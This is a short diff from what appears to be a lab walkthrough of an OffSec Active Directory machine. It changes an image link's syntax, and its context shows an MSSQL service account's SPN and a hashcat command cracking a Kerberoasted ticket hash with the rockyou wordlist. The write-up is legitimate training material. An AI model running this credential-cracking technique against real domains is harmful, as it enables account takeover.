@@ -104,7 +104,7 @@ DistinguishedName    : CN=MSSQL,CN=Users,DC=access,DC=offsec
 ServicePrincipalName : MSSQLSvc/DC.access.offsec
 
 ```
-![](../../../../../../assets/images/Pasted%20image%2020260501010008.png)
+![[Pasted image 20260501010008.png]]
 
 ```zsh
 hashcat -m 13100 --force -a 0 svc_mssql.kerberoast /usr/share/wordlists/rockyou.txt
